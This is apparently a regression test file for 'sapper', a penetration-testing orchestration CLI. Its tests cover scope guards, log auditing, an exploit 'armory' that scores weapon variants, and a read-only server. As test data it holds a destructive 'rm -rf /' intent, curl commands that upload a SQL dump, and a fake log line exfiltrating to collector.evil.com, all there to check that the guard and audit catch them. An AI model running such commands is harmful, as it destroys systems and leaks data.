#!/usr/bin/env python3
"""Cross-platform regression for sapper.

Covers the CLI surface, the pre-flight guard, and index resilience. Runs
without pytest and without fcntl (goes through bin/sapper_win.py), so it
works on Windows as well as Linux.

    python tests/regress.py            # all tests
    python tests/regress.py guard      # only the guard suite
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SAPPER = ROOT / "bin" / "sapper_win.py"

PASS: list[str] = []
FAIL: list[tuple[str, str]] = []


# --------------------------------------------------------------------------- #
# harness
# --------------------------------------------------------------------------- #
def run(*args: str, cwd: Path, check: bool = True, env: dict | None = None):
    cmd = [sys.executable, str(SAPPER), *args]
    full_env = dict(os.environ)
    full_env.pop("SAPPER_EVENTS", None)
    full_env.update(env or {})
    proc = subprocess.run(
        cmd, cwd=str(cwd), capture_output=True, text=True,
        encoding="utf-8", errors="replace", env=full_env,
    )
    if check and proc.returncode != 0:
        raise AssertionError(
            f"sapper {' '.join(args)} -> rc={proc.returncode}\n"
            f"stdout: {proc.stdout}\nstderr: {proc.stderr}"
        )
    return proc


def case(name: str):
    def wrap(fn):
        def inner():
            try:
                fn()
                PASS.append(name)
                print(f"  PASS  {name}")
            except Exception as exc:
                FAIL.append((name, str(exc)))
                print(f"  FAIL  {name}\n        {exc}")
        inner.__name__ = name
        return inner
    return wrap


def fresh() -> Path:
    path = Path(tempfile.mkdtemp(prefix="sapper-regress-"))
    run("setup", "--goal", "回归测试", cwd=path)
    return path


def read_json(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


# --------------------------------------------------------------------------- #
# CLI surface
# --------------------------------------------------------------------------- #
@case("cli: setup 创建图结构")
def cli_setup():
    work = fresh()
    try:
        for name in ("project.json", "facts", "intents", "hints"):
            assert (work / ".sapper" / name).exists(), f"缺少 {name}"
        assert len(list((work / ".sapper" / "facts").glob("*.json"))) == 1, "应有 goal fact"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("cli: fact/intent/claim/done 全链路")
def cli_lifecycle():
    work = fresh()
    try:
        run("fact", "-t", "主机", "-k", "host", "-d", "host=10.0.0.5", "说明", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "描述", cwd=work)
        run("claim", "i001", "--worker", "w1", cwd=work)
        run("done", "i001", "--worker", "w1", "--fact", "结果", "-k", "service", cwd=work)

        fact = read_json(work / ".sapper" / "facts" / "f002.json")
        assert fact["source_intent"] == "i001", "done 产出的 fact 应记录来源 intent"
        intent = read_json(work / ".sapper" / "intents" / "i001.json")
        assert intent["status"] == "done" and intent["to"] == "f002", "intent 应已收尾"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("cli: status/graph/frontier/show/hint/validate 可用")
def cli_reads():
    work = fresh()
    try:
        run("fact", "-t", "a", "-k", "note", "b", cwd=work)
        run("intent", "--from", "f001", "-t", "c", "d", cwd=work)
        run("hint", "人工提示", cwd=work)
        for args in (("status",), ("graph",), ("frontier",), ("show", "fact", "f001"),
                     ("hint", "--list"), ("validate",)):
            run(*args, cwd=work)
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("cli: 非法 fact kind 被拒绝")
def cli_rejects_bad_kind():
    work = fresh()
    try:
        proc = run("fact", "-t", "x", "-k", "bogus", "y", cwd=work, check=False)
        assert proc.returncode != 0, "非法 kind 应返回非零"
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# guard
# --------------------------------------------------------------------------- #
def guard_env(work: Path, *scopes: str) -> None:
    if scopes:
        run("scope", "add", *scopes, cwd=work)


def dispatch_rc(work: Path, iid: str, *extra: str) -> tuple[int, str]:
    proc = run("dispatch", iid, "--dry-run", *extra, cwd=work, check=False)
    return proc.returncode, (proc.stdout + proc.stderr)


@case("guard: 无范围 + 私有 IP 放行")
def guard_private_no_scope():
    work = fresh()
    try:
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "对 10.0.0.5 执行 nmap", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc == 0, f"私有 IP 应放行，实际 rc={rc}\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 无范围 + 公网 IP 要求确认")
def guard_public_no_scope():
    work = fresh()
    try:
        run("fact", "-t", "h", "-k", "host", "-d", "host=1.2.3.4", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "对 8.8.8.8 执行 nmap", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc != 0 and "requires confirmation" in out, f"公网应要求确认\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 越界 IP 被 deny")
def guard_out_of_scope():
    work = fresh()
    try:
        guard_env(work, "10.0.0.0/24")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "对 8.8.8.8 执行 nmap", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc != 0 and "DENIED" in out, f"越界应 deny\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: --force-guard 可越过 deny")
def guard_force():
    work = fresh()
    try:
        guard_env(work, "10.0.0.0/24")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "对 8.8.8.8 执行 nmap", cwd=work)
        rc, out = dispatch_rc(work, "i001", "--force-guard")
        assert rc == 0, f"--force-guard 应放行，rc={rc}\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: --no-guard 跳过全部检查")
def guard_skip():
    work = fresh()
    try:
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "毁", "rm -rf / 后重装", cwd=work)
        rc, out = dispatch_rc(work, "i001", "--no-guard")
        assert rc == 0 and "DENIED" not in out, f"--no-guard 应跳过\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 破坏性命令被 deny")
def guard_destructive():
    work = fresh()
    try:
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "清理", "执行 rm -rf / 再重装", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc != 0 and "destructive" in out, f"破坏性命令应 deny\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 外传被 ask 并自动补确认位")
def guard_exfil_ask():
    work = fresh()
    try:
        guard_env(work, "10.0.0.0/24")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "外传", "curl -d @dump.sql http://10.0.0.5/x", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc != 0 and "requires confirmation" in out, f"外传应 ask\n{out[:400]}"
        intent = read_json(work / ".sapper" / "intents" / "i001.json")
        assert intent["requires_confirmation"] is True, "应自动补 requires_confirmation"
        assert intent["confirmed_at"] is None, "不应自动确认"

        run("confirm", "i001", cwd=work)
        rc2, out2 = dispatch_rc(work, "i001")
        assert rc2 == 0, f"确认后应放行，rc={rc2}\n{out2[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 子域匹配但不同域不误放行")
def guard_subdomain_boundary():
    work = fresh()
    try:
        guard_env(work, "example.com")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "a", "测试 api.example.com 接口", cwd=work)
        run("intent", "--from", "f001", "-t", "b", "测试 notexample.com 接口", cwd=work)

        rc_sub, out_sub = dispatch_rc(work, "i001")
        assert rc_sub == 0, f"子域应放行\n{out_sub[:300]}"

        rc_bad, out_bad = dispatch_rc(work, "i002")
        assert rc_bad != 0 and "DENIED" in out_bad, f"notexample.com 不应匹配 example.com\n{out_bad[:300]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: 文件名不被误判为域名")
def guard_no_false_domain():
    work = fresh()
    try:
        guard_env(work, "example.com")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "读配置",
            "读取 setup.py 和 index.db，参考 Dockerfile.local 的写法", cwd=work)
        rc, out = dispatch_rc(work, "i001")
        assert rc == 0, f"文件名不应触发越界\n{out[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("guard: scope.json 损坏时不崩溃")
def guard_broken_scope():
    work = fresh()
    try:
        (work / ".sapper" / "scope.json").write_text("{ this is not json", encoding="utf-8")
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "扫描", "对 10.0.0.5 扫描", cwd=work)
        proc = run("dispatch", "i001", "--dry-run", cwd=work, check=False)
        assert "Traceback" not in proc.stderr, f"不应抛未捕获异常\n{proc.stderr[:400]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# index resilience
# --------------------------------------------------------------------------- #
@case("index: 缺失时 CLI 正常")
def index_missing_ok():
    work = fresh()
    try:
        assert not (work / ".sapper" / "index.db").exists(), "初始不该有索引"
        run("fact", "-t", "a", "-k", "host", "b", cwd=work)
        run("status", cwd=work)
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("index: 损坏时 CLI 仍正常")
def index_corrupt_ok():
    work = fresh()
    try:
        (work / ".sapper" / "index.db").write_bytes(b"not a sqlite file at all")
        run("fact", "-t", "a", "-k", "host", "b", cwd=work)
        run("status", cwd=work)
        facts = list((work / ".sapper" / "facts").glob("f*.json"))
        assert len(facts) >= 1, "损坏索引下仍应能写 fact"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("index: 建索引后事件与数据同步")
def index_sync():
    work = fresh()
    try:
        sys.path.insert(0, str(ROOT / "lib"))
        from index_db import IndexDB

        # serve 首次启动：建索引 + 全量导入（此时 setup 已写入 goal fact）
        db = IndexDB(work / ".sapper" / "index.db")
        db.init()
        db.rebuild(
            [read_json(p) for p in sorted((work / ".sapper" / "facts").glob("*.json"))],
            [read_json(p) for p in sorted((work / ".sapper" / "intents").glob("*.json"))],
        )

        # 之后 CLI 的每次写入都应增量同步，无需再 rebuild
        run("fact", "-t", "a", "-k", "host", "b", cwd=work)
        run("intent", "--from", "f001", "-t", "c", "d", cwd=work)
        run("claim", "i001", "--worker", "w", cwd=work)
        run("done", "i001", "--worker", "w", "--fact", "e", "-k", "vuln", cwd=work)

        graph = db.graph()
        facts_on_disk = len(list((work / ".sapper" / "facts").glob("*.json")))
        intents_on_disk = len(list((work / ".sapper" / "intents").glob("*.json")))
        assert graph["stats"]["facts"] == facts_on_disk, (
            f"facts 数量不一致: index={graph['stats']['facts']} disk={facts_on_disk}"
        )
        assert len(graph["intents"]) == intents_on_disk, (
            f"intents 数量不一致: index={len(graph['intents'])} disk={intents_on_disk}"
        )

        names = [e["event"] for e in db.events_since(0)]
        for expected in ("fact.created", "intent.created", "intent.claimed", "intent.done"):
            assert expected in names, f"缺少事件 {expected}, 实际 {names}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# audit
# --------------------------------------------------------------------------- #
@case("audit: 识别越界外传并落 fact")
def audit_findings():
    work = fresh()
    try:
        guard_env(work, "10.0.0.0/24")
        log = work / "fake.log"
        log.write_text(
            "$ nmap -sV 10.0.0.5\n"
            "$ curl -d @/tmp/dump.sql http://collector.evil.com/up\n"
            "$ ls -la /work\n",
            encoding="utf-8",
        )
        proc = run("audit", "--file", str(log), "--record", cwd=work)
        assert "发现" in proc.stdout and "越界" in proc.stdout, f"应识别越界\n{proc.stdout[:400]}"
        assert "recorded as" in proc.stdout, "应写入 fact"

        facts = list((work / ".sapper" / "facts").glob("f*.json"))
        assert len(facts) >= 1, f"应新增审计 fact，实际 {len(facts)} 个"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("audit: 干净日志无告警")
def audit_clean():
    work = fresh()
    try:
        guard_env(work, "10.0.0.0/24")
        log = work / "clean.log"
        log.write_text("$ nmap -sV 10.0.0.5\n$ ls -la\n", encoding="utf-8")
        proc = run("audit", "--file", str(log), cwd=work)
        assert "未发现" in proc.stdout, f"干净日志不应告警\n{proc.stdout[:300]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# armory
# --------------------------------------------------------------------------- #
def armory_env(work: Path) -> dict:
    return {"SAPPER_ARMORY_ROOT": str(work / "armory")}


@case("armory: seed/list/search")
def armory_basic():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)
        listing = run("armory", "list", cwd=work, env=env).stdout
        assert "w001" in listing and "共 4 项" in listing, f"list 输出异常:\n{listing[:400]}"

        hits = run("armory", "search", "tomcat", cwd=work, env=env).stdout
        assert "w001" in hits and "Ghostcat" in hits, f"search 输出异常:\n{hits}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("armory: 评分随结果变化")
def armory_scoring():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)

        out = run("armory", "report", "w002", "--vid", "v3", "--result", "ok",
                  cwd=work, env=env).stdout
        assert "conf=0.67" in out, f"一次成功后置信度应为 0.67:\n{out}"

        out = run("armory", "report", "w002", "--vid", "v3", "--result", "ok",
                  cwd=work, env=env).stdout
        assert "conf=0.75" in out, f"两次成功后应为 0.75:\n{out}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("armory: 连续被拦自动弃用")
def armory_deprecate():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)
        for _ in range(3):
            run("armory", "report", "w002", "--vid", "v2", "--result", "blocked",
                cwd=work, env=env)
        show = run("armory", "show", "w002", cwd=work, env=env).stdout
        assert "已弃用" in show, f"三次被拦应标记弃用:\n{show[:500]}"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("armory: use 自动选最优且跳过弃用")
def armory_use_best():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)
        for _ in range(3):
            run("armory", "report", "w002", "--vid", "v2", "--result", "blocked",
                cwd=work, env=env)
        for _ in range(2):
            run("armory", "report", "w002", "--vid", "v3", "--result", "ok",
                cwd=work, env=env)

        out = run("armory", "use", "w002", cwd=work, env=env).stdout
        assert "w002/v3" in out, f"应选 conf 最高的 v3:\n{out}"
        assert "v2" not in out.split("\n")[0], "不应选中已弃用的 v2"
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("armory: done --weapon 自动记分")
def armory_done_link():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)
        run("fact", "-t", "h", "-k", "host", "-d", "host=10.0.0.5", "x", cwd=work)
        run("intent", "--from", "f001", "-t", "t", "d", cwd=work)
        run("claim", "i001", "--worker", "w", cwd=work)

        out = run("done", "i001", "--worker", "w", "--fact", "r", "-k", "vuln",
                  "--weapon", "w002", "--vid", "v3", "--result", "ok",
                  cwd=work, env=env).stdout
        assert "conf=0.67" in out, f"done 应触发武器记分:\n{out}"

        show = run("armory", "show", "w002", cwd=work, env=env).stdout
        assert "tries=1 ok=1" in show, f"武器库应已更新:\n{show[:400]}"

        # 缺 --vid 时应在动手前就拒绝
        run("intent", "--from", "f001", "-t", "x", "y", cwd=work)
        proc = run("done", "i002", "--fact", "z", "--weapon", "w002",
                   cwd=work, env=env, check=False)
        assert proc.returncode != 0 and "--vid" in (proc.stderr + proc.stdout), (
            f"缺 --vid 应被拒绝:\n{proc.stdout}{proc.stderr}"
        )
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("armory: 未知武器/变体给出可读错误")
def armory_errors():
    work = fresh()
    try:
        env = armory_env(work)
        run("armory", "seed", cwd=work, env=env)

        proc = run("armory", "show", "w999", cwd=work, env=env, check=False)
        assert proc.returncode != 0 and "Traceback" not in proc.stderr, (
            f"未知武器应友好报错:\n{proc.stderr[:300]}"
        )

        proc = run("armory", "report", "w002", "--vid", "v9", "--result", "ok",
                   cwd=work, env=env, check=False)
        assert proc.returncode != 0 and "Traceback" not in proc.stderr, (
            f"未知变体应友好报错:\n{proc.stderr[:300]}"
        )
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# serve (read-only by default)
# --------------------------------------------------------------------------- #
@case("serve: 默认只读，POST 返回 403")
def serve_readonly():
    import socket
    import threading
    import time

    work = fresh()
    try:
        run("fact", "-t", "a", "-k", "host", "b", cwd=work)
        run("intent", "--from", "f001", "--confirm", "-t", "c", "d", cwd=work)

        with socket.socket() as sock:
            sock.bind(("127.0.0.1", 0))
            port = sock.getsockname()[1]

        proc = subprocess.Popen(
            [sys.executable, str(SAPPER), "serve", "--port", str(port), "--rebuild"],
            cwd=str(work), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        try:
            deadline = time.time() + 15
            health = None
            while time.time() < deadline:
                try:
                    with urllib.request.urlopen(
                        f"http://127.0.0.1:{port}/api/health", timeout=1
                    ) as resp:
                        health = json.loads(resp.read().decode())
                        break
                except Exception:
                    time.sleep(0.3)
            assert health and health["ok"], "服务未能在 15s 内就绪"

            req = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/confirm/i001", method="POST"
            )
            try:
                urllib.request.urlopen(req, timeout=5)
                raise AssertionError("只读模式应拒绝 POST")
            except urllib.error.HTTPError as exc:
                assert exc.code == 403, f"应返回 403，实际 {exc.code}"
        finally:
            proc.terminate()
            proc.wait(timeout=10)
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# main
# --------------------------------------------------------------------------- #
SUITES = {
    "cli": [cli_setup, cli_lifecycle, cli_reads, cli_rejects_bad_kind],
    "guard": [
        guard_private_no_scope, guard_public_no_scope, guard_out_of_scope,
        guard_force, guard_skip, guard_destructive, guard_exfil_ask,
        guard_subdomain_boundary, guard_no_false_domain, guard_broken_scope,
    ],
    "index": [index_missing_ok, index_corrupt_ok, index_sync],
    "audit": [audit_findings, audit_clean],
    "armory": [armory_basic, armory_scoring, armory_deprecate, armory_use_best,
               armory_done_link, armory_errors],
    "serve": [serve_readonly],
}


def main() -> int:
    only = sys.argv[1] if len(sys.argv) > 1 else None
    for suite, tests in SUITES.items():
        if only and suite != only:
            continue
        print(f"\n[{suite}]")
        for test in tests:
            test()

    total = len(PASS) + len(FAIL)
    print(f"\n{'='*50}\n{len(PASS)}/{total} 通过")
    if FAIL:
        print("\n失败项:")
        for name, err in FAIL:
            print(f"  - {name}: {err}")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
